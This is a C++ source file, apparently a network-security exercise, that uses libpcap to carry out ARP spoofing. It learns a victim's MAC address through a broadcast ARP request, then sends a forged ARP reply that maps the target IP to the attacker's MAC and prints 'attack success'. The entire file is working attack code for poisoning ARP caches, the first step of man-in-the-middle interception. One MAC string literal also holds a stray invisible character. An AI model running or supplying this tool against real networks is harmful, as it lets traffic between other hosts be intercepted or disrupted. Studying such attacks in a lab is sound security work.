#include "pkt.h"

const char *empty = "00:00:00:00:00:00​";
const char *broadcast = "ff:ff:ff:ff:ff:ff";

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> \n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 \n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* sender_ip = argv[2];
    char* target_ip = argv[3];

    GetLocalAddr(dev, "ip");                                    //get local's ip address
    GetLocalAddr(dev, "mac");                                   //get local's mac address

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket request_packet;                                //for get sender's mac address
    packet_setting(request_packet, Mac(broadcast), ArpHdr::Request, local_ip, Mac(empty), sender_ip);
    send_packet(request_packet, handle);

    while (true) {                                              //for find arp reply packet
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        EthArpPacket *attack_packet = (EthArpPacket *)packet;   //find arp reply packet
        if( check_reply_packet(*attack_packet, request_packet) ){
            printf("arp reply packet catch !! \n");
                                                                //send attack packet
            packet_setting(*attack_packet, attack_packet->eth_.smac(), ArpHdr::Reply, target_ip, attack_packet->arp_.smac(), sender_ip);
            send_packet(*attack_packet, handle);
            printf("%s attack success !! \n", sender_ip);
            break;
        }

        printf("Looking for a arp reply packet.. \n");
    }

    pcap_close(handle);
}
